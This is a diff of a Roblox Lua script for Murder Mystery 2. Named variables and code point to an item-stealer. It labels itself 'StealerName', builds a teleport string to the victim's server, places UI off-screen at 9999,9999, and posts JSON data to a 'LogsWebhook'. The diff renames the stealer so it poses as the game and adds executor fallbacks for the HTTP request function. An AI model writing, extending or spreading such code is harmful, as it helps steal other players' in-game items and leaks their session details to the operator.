@@ -30,10 +30,10 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
-local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local Position = UDim2.new(0, 9999, 0, 9999)
 local Inventory = {}
-local StealerName = "m.kai"
+local StealerName = "Murder Mystery 2"
 
 local function sendnotification(message)
     getgenv().scriptexecuted = false
@@ -389,11 +389,12 @@ request({
     Body = game.HttpService:JSONEncode(data)
 })
 
+local request = http_request or request or HttpPost or syn.request
 request({
-    Url = LogsWebhook,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
+  Url = LogsWebhook,
+  Method = "POST",
+  Headers = {
+      ["Content-Type"] = "application/json"
     },
     Body = game.HttpService:JSONEncode(data)
 })
